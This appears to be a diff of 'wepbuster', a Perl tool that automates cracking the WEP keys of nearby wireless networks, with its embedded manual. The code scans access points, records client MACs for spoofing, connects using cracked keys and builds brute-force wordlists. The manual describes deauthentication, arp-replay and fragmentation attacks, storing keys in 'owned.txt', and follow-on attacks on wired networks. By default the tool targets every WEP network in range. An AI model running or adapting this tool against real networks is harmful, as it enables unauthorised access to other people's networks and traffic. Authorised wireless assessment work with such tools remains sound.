-	print "<< DEBUG >>: SETTING DEFAULT GATEWAY TO 192.168.1.1...\n" if $debug;
-	print "<< DEBUG >>: RUNNING \"route add default gw 192.168.1.1 > \/dev\/null 2>\&1\"...\n" if $debug;
-   	`route add default gw 192.168.1.1 > /dev/null 2>&1`;
-	print "Testing connectivity...\n";
-        $gateway = '192.168.1.1';
-	if ($pinghost eq 'gateway'){
-	  print "Pinging $gateway...\n";
-	}else{
-	  print "Pinging $pinghost...\n";
-	}
-      $ping_status = ($pinghost eq 'gateway')?pingtest($gateway):pingtest($pinghost);
-      if ($ping_status eq 'success'){
-         return 'success';
-      }else{
-	  return 'failed';
-      }
+    print "<< DEBUG >>: SLEEPING FOR 15 SECONDS...\n" if $debug;
+    sleep 15;
+    print "<< DEBUG >>: CHECKING IF WE HAVE SUCCESSFULLY ASSOCIATED...\n" if $debug;
+    print "<< DEBUG >>: RUNNING \"iwconfig $inject_iface \|\"...\n" if $debug;
+    open IWCONFIG, "iwconfig $inject_iface |" or die "Can't run iwconfig.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}: $!\n\n";
+    while (<IWCONFIG>){
+        if (/linked/){
+	    print "<< DEBUG >>: FOUND \/linked\/ IN iwconfig OUTPUT...\n" if $debug;
+	    print "Associated successfully...\n";
+	    print "Setting (IP : Gateway) manually... (192.168.1.150 : 192.168.1.1)\n";
+	    print "<< DEBUG >>: RUNNING \"ifconfig $inject_iface 192.168.1.150 netmask 255.255.255.0 > \/dev\/null 2>\&1\"...\n" if $debug;
+   	    `ifconfig $inject_iface 192.168.1.150 netmask 255.255.255.0 > /dev/null 2>&1`;
+	    print "<< DEBUG >>: RUNNING \"route delete default > \/dev\/null 2>\&1\"...\n" if $debug;
+   	    `route delete default > /dev/null 2>&1`;
+	    print "<< DEBUG >>: SETTING DEFAULT GATEWAY TO 192.168.1.1...\n" if $debug;
+	    print "<< DEBUG >>: RUNNING \"route add default gw 192.168.1.1 > \/dev\/null 2>\&1\"...\n" if $debug;
+   	    `route add default gw 192.168.1.1 > /dev/null 2>&1`;
+	    print "Testing connectivity...\n";
+            $gateway = '192.168.1.1';
+	    if ($pinghost eq 'gateway'){
+	        print "Pinging $gateway...\n";
+	    }else{
+	        print "Pinging $pinghost...\n";
+	    }
+            $ping_status = ($pinghost eq 'gateway')?pingtest($gateway):pingtest($pinghost);
+            if ($ping_status eq 'success'){
+                return 'success';
+            }else{
+	        return 'failed';
+            }
 
-  }else{
-   return 'failed';
-  }
-}
+        }else{
+            return 'failed';
+        }
+    }
 
 
 }elsif($op eq 'ping'){ 
@@ -1531,11 +1670,11 @@ while (<IWCONFIG>){
       print "Successfully connected to \"$ssid\" ($bssid)...\n";
       sleep 2;	
       if ($pinghost eq 'gateway'){
-         print "Getting RTT of gateway ($gateway)...\n";
-	$pinghost = $gateway;
-       }else{
-	 print "Getting RTT of $pinghost...\n";
-	}
+          print "Getting RTT of gateway ($gateway)...\n";
+	  $pinghost = $gateway;
+      }else{
+          print "Getting RTT of $pinghost...\n";
+      }
       print "<< DEBUG >>: RUNNING \"ping -q -c $pingcount $pinghost \|\"...\n" if $debug; 
       open PING, "ping -q -c $pingcount $pinghost |" or die "Can't run ping.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}: $!\n\n";
       while (<PING>){
@@ -1552,14 +1691,16 @@ while (<IWCONFIG>){
         }
 	 
       }	
-	$pingresponse{'rtt'} = 99999;
-	return \%pingresponse;
+
+      $pingresponse{'rtt'} = 99999;
+      return \%pingresponse;
+
    }else{
 	print "Connection failed. Skipping...\n\n";
 	return;
    }
 
- }
+}
 
 }
 
@@ -1582,42 +1723,48 @@ if ($ping != 0){
 	   $manualip = 0;
 	   return 'failed';
 	}
-   print "Ping failed!!\n";
-   print "Trying DHCP...\n";
+        print "Ping failed!!\n";
+        print "Trying DHCP...\n";
 	print "<< DEBUG >>: FORKING ANOTHER CHILD PROCESS FOR DHCLIENT...\n" if $debug;
 	die "Could not fork dhclient!: $!\n\n" unless defined (my $pid = fork);
 	if ($pid == 0){
 	   print "<< DEBUG >>: RUNNING \"dhclient $inject_iface 2>\&1\"...\n" if $debug;
 	   `dhclient $inject_iface 2>&1`;
 	   print "<< DEBUG >>: DHCLIENT CHILD PROCESS DONE. EXITING...\n" if $debug;
-	exit(0);
+	   exit(0);
 	}	
+
 	waitpid($pid, 0);
-	 print "<< DEBUG >>: TRYING TO GET THE GATEWAY BY PARSING NETSTAT OUTPUT...\n" if $debug;
-	 print "<< DEBUG >>: RUNNING \"netstat -rn \|\"...\n" if $debug;
-         open NETSTAT, "netstat -rn|" or die "Can't run netstat.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}: $!\n\n"; 
-         while (<NETSTAT>){
+	print "<< DEBUG >>: TRYING TO GET THE GATEWAY BY PARSING NETSTAT OUTPUT...\n" if $debug;
+	print "<< DEBUG >>: RUNNING \"netstat -rn \|\"...\n" if $debug;
+
+        open NETSTAT, "netstat -rn|" or die "Can't run netstat.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}: $!\n\n"; 
+        while (<NETSTAT>){
            next unless /^0.0.0.0/;
            $gateway = (split/\s+/,$_)[1];
 	   print "<< DEBUG >>: GATEWAY FOUND!!! -> $gateway...\n" if $debug;
-         }
-   $manualip = 1;
-   print "Testing connectivity...\n";
-      if ($pinghost eq '192.168.1.1'){
-	  print "Pinging $gateway...\n";
-      }else{
-	  print "Pinging $pinghost...\n";
-      }
-      my $ping_status = ($pinghost eq '192.168.1.1')?pingtest($gateway):pingtest($pinghost);
-   if ($ping_status eq 'success'){
-       return 'success';
-   }else{
-	return 'failed';
-	}
+        }
+
+        $manualip = 1;
+
+        print "Testing connectivity...\n";
+        if ($pinghost eq '192.168.1.1'){
+	    print "Pinging $gateway...\n";
+        }else{
+	    print "Pinging $pinghost...\n";
+        }
+
+        my $ping_status = ($pinghost eq '192.168.1.1')?pingtest($gateway):pingtest($pinghost);
+
+       if ($ping_status eq 'success'){
+            return 'success';
+       }else{
+	    return 'failed';
+       }
 
 }else{
-  print "Ping successful!!\n";
-  return 'success';
+     print "Ping successful!!\n";
+     return 'success';
 }
 }
 
@@ -1650,7 +1797,7 @@ die "Could not fork airodump-ng!: $!\n\n" unless defined (my $pid = fork);
 
 if ($pid == 0){
   print "\nScanning channel $channel for WEP-enabled Access Points\n";
-  print "<< DEBUG >>: RUNNING \"airodump $monitor_iface -t wep -c  $channel --output-format csv -w $filename 2\>\&1\"...\n" if $debug;
+  print "<< DEBUG >>: RUNNING \"airodump-ng $monitor_iface -t wep -c  $channel --output-format csv -w $filename 2\>\&1\"...\n" if $debug;
  `airodump-ng $monitor_iface -t wep -c  $channel --output-format csv -w $filename 2>&1`;
 }
 
@@ -1674,36 +1821,35 @@ print "<< DEBUG >>: EXTRACTING ACCESS POINTS", ($mode eq 'crack')?" AND CONNECTE
 unless (open CSV, $csv){
  print "Cannot open airodump output.: $!\nSleeping for 2 seconds...";
  sleep 2;
- open CSV, $csv or die "Still Can\'t open airodump output! $!\nTry increasing \$scan_duration.\nExiting...\n";
+ open CSV, $csv or die "\nStill can\'t open airodump output! $!\nTry increasing \$scan_duration.\nExiting...\n";
 
 }
 while (<CSV>){
-chomp;
-next if /^\r$/;
+  chomp;
+  next if /^\r$/;
 
 
-if (/^BSSID/){
-$basestation = 1;
-}
+  if (/^BSSID/){
+    $basestation = 1;
+  }
+  if (/^Station/){
+    $basestation = 0;
+  }
 
-if (/^Station/){
-$basestation = 0;
-}
-
-if ($basestation){
-next if /^BSSID/;
-  $chan_on_file = (split /,\s+/,$_)[3];
-  next if $channel != $chan_on_file;
-  my @uglyssid = (split/,/, $_,13);
-  $ssid = "@uglyssid"; 
-  ($ssid) = $ssid =~ /\d+,\s+(.+)\s+.$/;
-  chop $ssid;
-  $ssidlen = length($ssid); 
-  $ssid =~ s/\x00*//g;
-  $ssid =~ s/^\s*$/$hssid/;
-  $bssid = (split /,\s+/,$_)[0];
-  $iv = (split /,\s+/,$_)[10];
- $all_ap{ $bssid } = {
+  if ($basestation){
+      next if /^BSSID/;
+      $chan_on_file = (split /,\s+/,$_)[3];
+      next if $channel != $chan_on_file;
+      my @uglyssid = (split/,/, $_,13);
+      $ssid = "@uglyssid"; 
+      ($ssid) = $ssid =~ /\d+,\s+(.+)\s+.$/;
+      chop $ssid;
+      $ssidlen = length($ssid); 
+      $ssid =~ s/\x00*//g;
+      $ssid =~ s/^\s*$/$hssid/;
+      $bssid = (split /,\s+/,$_)[0];
+      $iv = (split /,\s+/,$_)[10];
+     $all_ap{ $bssid } = {
 			 bssid => $bssid,
 			 iv => $iv,
 			 channel => $chan_on_file,
@@ -1714,20 +1860,20 @@ next if /^BSSID/;
 			 clients => []
 			}; 
 
-}elsif ($mode eq 'crack'){
+  }elsif ($mode eq 'crack'){
 ### We only get the connected clients if we are cracking
- next if /not/;
- next if (/^Station/);
-  $bssid = (split /,\s+/,$_)[5];
-  $client = (split /,\s+/,$_)[0];
+     next if /not/;
+     next if (/^Station/);
+     $bssid = (split /,\s+/,$_)[5];
+     $client = (split /,\s+/,$_)[0];
 
 ### Store clients to the 'client' anonymous array we have created before
 ### exists check is for the BSSIDs we found here that we didn't find above (meaning, we only found the bssid because of the client)
-  if (exists $all_ap{$bssid}){
-      print "<< DEBUG >>: $client CONNECTED TO $bssid. SAVING...\n" if $debug;
-      push @{$all_ap{$bssid}->{'clients'}}, $client;
+     if (exists $all_ap{$bssid}){
+         print "<< DEBUG >>: $client CONNECTED TO $bssid. SAVING...\n" if $debug;
+         push @{$all_ap{$bssid}->{'clients'}}, $client;
+     }
   }
-}
 
 
 
@@ -1750,7 +1896,6 @@ if ($apcount != 0){
    }
 }
 print "\n";
-
 return \%all_ap;
 }
 
@@ -1848,3 +1993,458 @@ return $answer if defined $answer;
 
 }
 ##################   END  SUB  SELECT_IFACE   ###############################
+
+
+
+
+
+
+sub wordlistgen{
+
+
+
+if (defined $filters{input} && $filters{input} ne ''){
+ if (-e $filters{input}){
+   open FILTER, $filters{input} or die $!;
+   while (<FILTER>){
+     chomp;
+     print "$_\n" unless filtered($_, \%filters);
+   }
+   exit;
+ }else{
+	print "Input file missing.\n";
+ }
+}
+
+
+if (defined $merge{input} && $merge{input} gt ''){
+my ($input, $source, $mergedword);
+
+  if (defined $merge{source} && $merge{source} gt ''){
+      if (open INPUT, $merge{input}){
+        while ($input=<INPUT>){
+          chomp $input;
+          open SOURCE, $merge{source} or die "At least source file must exist.\n$!";
+          while (my $source=<SOURCE>){
+            chomp $source;
+	    $mergedword = "$input$source";
+ 	    print "$mergedword\n" unless filtered($mergedword, \%filters);
+          }
+        }
+      }else{
+	$input = $merge{input};
+        open SOURCE, $merge{source} or die "At least source file must exist.\n$!";
+        while ($source=<SOURCE>){
+	 chomp $source;
+	 $mergedword = "$input$source"; 
+ 	 print "$mergedword\n" unless filtered($mergedword, \%filters);
+        } 
+
+      }
+  }else{
+    print "Source parameter missing.\n";
+    exit(1);
+  }
+exit(0);
+}
+
+
+
+
+if ($uniq){
+  if ($fastpermute){ 
+     Algorithm::Permute::permute { print split(/ /, join("",@set)),"\n" } @set;
+  }else{
+    foreach($pwlen->range){
+    permute_uniq(\@set, $_);
+  }
+}
+
+}else{
+
+foreach($pwlen->range){
+ permute_all(0, $_);
+}
+
+}
+
+exit;
+
+}
+
+
+
+sub permute_all{
+ my ($start, $pwlen) = @_;
+ if ($start>=$pwlen){
+   print "$word\n" unless filtered($word,\%filters);
+   return;
+ }
+
+for(@set){
+  substr($word,$start,1) = $_;
+  permute_all($start+1,$pwlen);
+ }
+}
+
+
+sub permute_uniq{
+ my ($set, $pwlen) = @_;
+ my $word;
+ my $p = new Algorithm::Permute([@$set], $pwlen);
+ while ($word = join('', $p->next)){
+	print $word,"\n" unless filtered($word,\%filters);
+ }
+}
+
+
+sub filtered{
+
+my ($word, $filters) = @_;
+my @subset;
+
+if (exists $$filters{source}){
+  if (-e $$filters{source}){
+    my $pattern = read_file($$filters{source});
+    if ($pattern =~ /$word/m){
+	return 1;
+    }else{
+        if (exists $$filters{count} && $$filters{count} < length($word)){
+         my $max = length($word) - $$filters{count}; 
+	 my $subpattern = '';
+         for my $i ( 0 .. $max) {
+  	     foreach (substr( $word, $i, $$filters{count})){
+		$subpattern = $subpattern . $_;
+	     }
+	     return 1 if $pattern =~ /$subpattern/;
+	     $subpattern = '';
+		
+	  }
+        }
+
+     }
+         
+  }else{
+    my $pattern = $$filters{source};
+    if ($pattern =~ /$word/){
+	return 1;
+    }else{
+       if (exists $$filters{count} && $$filters{count} < length($word)){
+        my $max = length($word) - $$filters{count}; 
+	 my $subpattern = '';
+         for my $i ( 0 .. $max) {
+  	     foreach (substr( $word, $i, $$filters{count})){
+		$subpattern = $subpattern . $_;
+	     }
+	     return 1 if $pattern =~ /$subpattern/;
+	     $subpattern = '';
+		
+	  }
+       }
+    }
+  
+ }
+}
+
+
+if (exists $$filters{length} && length($word) == $$filters{length}){
+return 1;
+}
+
+
+ if (exists $$filters{vowel}){
+   my $vowels = '[aeiouAEIOU]';
+   if ($word =~ /$vowels/){
+     if ($$filters{vowel}){
+
+        my ($vowdupcount, $vowadjcount);
+        ($vowdupcount) = $$filters{vowel} =~ /^(\d+)/ or $vowdupcount = 0;
+        ($vowadjcount) = $$filters{vowel} =~ /,(\d+)/ or $vowadjcount = 0;
+        (my $voweldup) = $word =~ /($vowels)(\1+)/ unless $vowdupcount == 0;
+
+        if (defined $voweldup){ 
+           if ($vowdupcount > 0 && $word =~ m/($voweldup){$vowdupcount}/){
+		return 1;
+	   }
+
+        } 
+
+        if ($vowadjcount > 0){
+         	 $vowels = $vowels x $vowadjcount;
+	         return 1 if $word =~ /$vowels/;
+             
+        }
+
+      
+    }else{
+     return 1;
+    }
+
+  }
+ 
+}
+
+if(exists $$filters{consonant}){ 
+   my $consonants = '[bcdfghj-np-tv-zBCDFGHJ-NP-TV-Z]';
+   if ($word =~ /$consonants/){
+     if ($$filters{consonant}){ 
+
+        my ($consdupcount, $consadjcount);
+        ($consdupcount) = $$filters{consonant} =~ /^(\d+)/ or $consdupcount = 0;
+        ($consadjcount) = $$filters{consonant} =~ /,(\d+)/ or $consadjcount = 0;
+        (my $consdup) = $word =~ /($consonants)(\1+)/ unless $consdupcount == 0;
+
+        if (defined $consdup){
+          if ($consdupcount > 0 && $word =~ m/($consdup){$consdupcount}/){
+	     return 1;
+          }
+
+        }
+          if ($consadjcount > 0){ 
+	    $consonants = $consonants x $consadjcount; 
+	    return 1 if $word =~ /$consonants/;
+	    
+          }
+
+     }else{
+	return 1;
+     }
+   }
+ 
+ 
+}
+
+return;
+
+}
+
+
+
+
+#####################################  BEGIN EMBEDDED DOCUMENTATION  #############################################################
+
+=head1 NAME
+
+wepbuster - Automated WEP cracker and wordlist generator 
+
+=head1 SYNOPSIS
+
+=over 5
+
+=item wepbuster [channel(s)]
+
+=item wepbuster [sort | connect] [hostname/ipaddress]
+
+=item wepbuster permute [OPTIONS]
+
+=back
+
+
+=head1 DESCRIPTION
+
+WEPBuster is a small utility written for information security professional to aid in conducting Wireless Security Assessment.
+The script executes various programs included in the aircrack-ng suite - a set of tools for auditing wireless networks, in order to
+obtain the WEP encryption key of a wireless access point. A built-in wordlist generator can be used in
+creating "dictionary" files for WPA Pre-Shared Key cracking and for other related tasks. 
+The list of supported options are as follows:
+
+
+=head1 OPTIONS 
+
+(Wordlist Generator)
+
+=over 8
+
+
+=item B<--charset>
+
+(lower, upper, number, symbol, nonsymbol, string, file) - Character set(s) to be used. Accepts ranges (Ex. j-h, a..f), string or text file.
+
+=item B<--uniq>
+
+Generate words without repeating characters.
+
+=item B<--length> 
+
+(Ex. 2, 4, 6-8, 9..11) - Lengths of words to be created. Ranges are accepted. (defaults to the length of the charset)
+
+=item B<--filter>
+
+=over 5
+
+=item vowel={m,n} 
+
+Filter a word if it has vowel(s) or if it has m repeated and/or n consecutive vowels.
+
+=item consonant={m,n}
+
+Filter a word if it has consonant(s) or if it has m repeated and/or n consecutive consonants.
+
+=item length=n
+
+Filter a word if length is not equal to n.
+
+=item source=file|string
+
+Filter a word if it appears anywhere in the file or string.
+
+=item count=n
+
+In conjuction with source filter, n length subsets of the word are matched.  (Ex. if the word is "abcd" and count=2, then the word will be filtered if there is an "ab" or "bc" or "cd" anywhere in the filter source file/string.
+
+=item input=file
+
+Reads the input file and filters out lines according to the specified filters.
+
+
+=back
+
+=item B<--merge>
+
+Merges each line of two files together.
+
+=over 5
+
+=item input=file|string
+
+Where source file will be merged into. If file does not exist, string is used.
+
+=item source=file
+
+The source file to merge into the input file. 
+
+=back
+
+=item B<--help>
+
+Display options summary.
+
+=item B<--man>
+
+Display the manual.
+
+=back
+
+=head1 WEP CRACKING PROCESS
+
+When invoked without any arguments, the program initially builds a list of all WEP-enabled access points within the range using airodump-ng(1) on each non-overlapping channel of the country specified. (US 1, 6, 11 and EU 1, 5, 9, 13). If there's any, associated stations are also saved for use in mac address spoofing when dealing with access points with hidden SSIDs or those with mac address filtering enabled. Once done scanning, the automated WEP cracking begins. The script will go through the list and attempt to crack each access point listed. A white list (known_ap.txt) and black list (bad_ap.txt) text files on the current working directory are consulted to know if a particular access point is to be skipped or not. 
+
+The first step in the actual WEP cracking is to associate the cracking station using aireplay-ng(1) to the target access point. Shared-key authentication (SKA) is also done automatically. If the SSID is unknown or hidden , association will not be possible hence, the script will use aireplay-ng to launch deauthentication attacks in order to reveal the ssid. Once associated, the script will use aireplay-ng(1) to launch an arp-replay attack against the access point. When a particular period has elapsed and the IV count did not increase significantly, fragmentation attack will be launched. If fragmentation attack was successful (keystream was found), the script will use packetforge-ng(1) in order to build an arp packet to be used in arp-replay attack. If unsuccessful, fragmentation attack will be stopped and rebroadcast attack (-p0841) will be tried next. 
+
+If all goes well, wepbuster should display the IV counts as they increase. When enough IVs are collected, the script will launch aircrack-ng(1) and will try to crack the WEP encryption key using the collected data packet dumps. If successful, the WEP key will be saved into the text file "owned.txt" in the current working directory. This entire process is repeated until all the access points included in the initial list are processed. 
+
+
+=head2 OPTIONS EXPLAINED
+
+=over 5
+
+=item B<Channels>
+
+WEPBuster can accept space separated numbers as arguments. However, for each run, these channels are limited only to whichever country was set in the script. This means that if the $country variable in the script is set to "US" (default), the user can only scan channels 1, 6, and 11. All other channels that were entered are skipped. When "EU" is selected, any of the channels 1, 5, 9, and 13 can be scanned. Unless you know what you are doing, there is really no point in setting the $country variable to "all" which will tell WEPBuster to scan all channels from 1 to 14. 
+
+When done scanning, WEPBuster writes the output into "owned.txt" text file in the current working directory. A sample entry is shown below:
+
+00:ff:bb:cc:dd:ee === 6 === gabion === 05:21:56:36:56 === 1246694544
+
+
+The first field is the BSSID or mac address of the access point, second is the channel, followed by ssid, the actual WEP key, and lastly the timestamp.
+
+
+=item B<Sorting and Connecting>
+
+An extra feature of WEPBuster is the ability to sort all the cracked access points based on ping(1) round trip time to any host specified, and eventually make a connection to the first connectible access point. This feature is more of a proof-of-concept of what can be automated once the WEP key is known. Typical attacks on wired networks can be employed since WLAN is just an extension of the wired local area network. 
+
+When sorting, the output, which is the list of sorted access points, is written into "owned_rtt.txt" text file in the current working directory. 
+The text file looks the same as the cracked AP list ("owned.txt"), except that the round trip time is appended to each entry along with the percentage of packet loss. Once this list is completed, the script rewrites "owned.txt" in order to reflect the ordering in this list.
+
+00:xx:xx:xx:xx:xx === 6 === gabion === 05:21:56:36:56 === 1246694544 === 7.442 (0% loss)
+
+
+=item B<White list and Black list>
+
+During a wireless security assessment, it is important for the penetration tester to limit the scope of his attacks to only those access points which are owned by the client. Creating a text file "known_ap.txt" containing the mac addresses or BSSID of the target access points (one entry per line) will make WEPBuster skip whichever access point that is not included in the list. A blacklist file called "bad_ap.txt" does the opposite.
+
+=item B<Wireless Interface Detection>
+
+The wireless interface detection is done by the script automatically. When the script is run, it executes airmon-ng(1) to obtain a list of all the wireless cards currently installed on the system and puts each into monitor mode. After this, the corresponding monitor interface (if there's any) is obtained and the user is given a prompt for wireless card selection in case multiple interfaces were found. This automatic detection feature may not work in every setup, hence the user can simply modify the variables $inject_iface, $monitor_iface, and $macaddress in the script in order to specify the correct interfaces to use.
+
+=item B<Extending Fragmentation Attack>
+
+By default, unless the keystream is found, fragmentation attack will only last when the number of data packets as specified in the variable $packets_to_try has been tried or until the number of seconds set in $frag_timeout has elapsed. The idea is that if an access point is indeed vulnerable to fragmentation attack, most likely, it wouldn't take that much time or data packets to exploit it. The user can freely set those variables to any preferred value.
+
+
+=back
+
+
+=head1 WORDLIST GENERATOR
+
+The key to a successful bruteforce attack is to have a good dictionary file. It is a known fact that at this point, one cannot just create a dictionary file by generating all the possible combinations of all the character sets and expect to make it useable upon completion, if at all. Building a dictionary file for bruteforce password guessing is a tricky exercise. People came up with various ideas such as crawling a website in order to extract unique words from it, word association using data mining, "leetifying", case switching (e.g., lower to upper), mutation, etc. 
+
+WEPBuster is capable of generating all combinations of a given set and at the same time apply filters to each generated word in order to make the resulting word list size significantly smaller.
+Ex. Suppose you asked your friend to think of an eight character, all lower case, word as a name for a dog. Even with the length of the word (8) and character set (a-z) known to you, guessing would still be extremely difficult. No, don't even think of generating all possible 8-character combinations of the letters from a to z as it would take gazillion years to finish. To transform this into a numerical context, typing 26**8 in google search in order to compute the number of all possible combinations would give you 208 827 064 576. That's about 208 billion 8-character words. And if one character occupies one byte, you would then have to multiply it to 9(including newline character) in order to get the resulting size in bytes. 
+
+So what would you do in this situation? Would you rather use someone else's dictionary or build your own?
+
+The way I would handle this is by breaking that 8 characters into smaller parts. I have a good feeling that your friend would not name a dog starting or ending with two identical characters, whether it is a cartoon character, name of a planet, name of a president, or a tv show. The first thing I would do is to create all unique 2-character combinations of the letters from a-z. Once I have the list, I would then use /usr/share/dict/words to trim it down further by making sure that if a 2-character word is not found anywhere in the dictionary, it will not be included in my list. At this point I have a two-character unique word list which I can use for the first and the last two characters of the mystery word.
+
+Next, I need to build a four-character word list to be used as the middle four characters of the mystery word. This time, words could be anything. Even repetition is likely. I have a good feeling that whatever name your friend would choose for a dog, it must be something that he or his kids could easily pronounce, remember, or perhaps even spell out. Something that does not contain four consecutive consonants or four consecutive vowels. I could even trim down my list such that only those three consecutive consonants or vowels found in /usr/share/dict/words would be included. Further, only those words with two identical characters found in the dictionary would be kept. Once I have the four-character word list, the only thing left to do append my two-character word list on both sides, while applying all the filters I have applied before. 
+
+This entire process could be too tedious but definitely more feasible than generating all the possible eight-character combinations of the letters from a-z. And if your friend named the mystery dog as "superdog" or even "supercat" the word would most likely be found in the list in no time. 
+
+
+=head2 OPTIONS EXPLAINED
+
+=over 5
+
+=item B<--charset>
+
+Character sets could be any combination of "number", "lower", "upper", "symbol", or "nonsymbol". Text files and any string can also be used. Ranges (e.g., a-f, n..p, 1-5) are also supported. This parameter is required.
+
+=item B<--uniq>
+
+When this option is passed, the script generates all combinations of a given set without repeating characters. 
+
+=item B<--length>
+
+This option specifies the length of the words to be generated. Any number and range combinations are accepted. (e.g., 0-3, 4, 7,9, 10..12). If there is no length specified, the default is to get the length or number of characters on
+the given charset. When --uniq argument is passed and there is no --length specified, the script uses a faster algorithm to do the permutations, the downside however is that no filters can be applied to the resulting words. 
+
+=item B<--filters>
+
+=over 5
+
+=item vowel|consonant={m,n}
+
+When this filter is applied, any word which has at least one vowel/consonant will be skipped. If the optional values are specified, the word instead would be filtered if it as at least m repeated, and/or n consecutive vowels or consonants.  Ex. "wepbuster permute -c abcd -l 3 -f vowel=,3" will filter out those words which have at least three consecutive vowels, and the command "wepbuster permute -c abcd -l 3 -f consonant=2,3" will filter out those words which have at least two consecutive identical and 3 consecutive consonants.
+
+=item length=n
+
+This option filters out words unless their length is equal to n. Obviously, when the --length option was initially specified, there is no use for this filter. This is only useful when filtering input files or wordlist.
+
+=item source=file|string
+
+This script is particularly useful when you want to generate or filter out words which are included in a certain word list, e.g., a Russian dictionary. The source file is read at once (slurping) and each generated word is checked if it is contained anywhere in the source file. The process of slurping which is reading a file at once is particularly beneficial in situations like this. However, due care must be taken in order to avoid performance penalties. Slurping a megabyte-size file should not be a problem. If the file does not exist, the string is used as a filter.
+
+=item count=n
+
+This filter is used in conjuction with the source file filter. When this is specified, n-character subsets of a word is matched against the source file or string. (Ex. if the word is "abcd" and count=2, then the word will be filtered if there is an "ab" or "bc" or "cd" anywhere in the filter source file/string. 
+
+Suppose I want to generate four-character lower case wordlist but I want to make sure that if a word contains three consecutive consonants, the word will be accepted only if those consecutive consonants are found in the dictionary, e.g., /usr/share/dict/words. This could significantly shrink the size of my resulting word list. The first step is to generate all three possible consonants combinations and use the dictionary as a source filter  - "wepbuster permute -c lower -l 3 -f vowel -f source=/usr/share/dict/words > avoidedtrio.txt". The resulting list contains three-consonant words which are not contained in the dictionary. I will then use this list to filter out the four-character combination word list which I'm going to create - "wepbuster permute -c lower -l 4 -f source=avoidedtrio.txt -f count=3".
+
+
+=item input=file
+
+When this option is specified, the script will read the file or wordlist line by line and filter out those lines according to whatever filters were specified.
+
+=back
+
+
+
+
+=back
+
+
+
+=cut
+
+#####################################  END EMBEDDED DOCUMENTATION  #############################################################
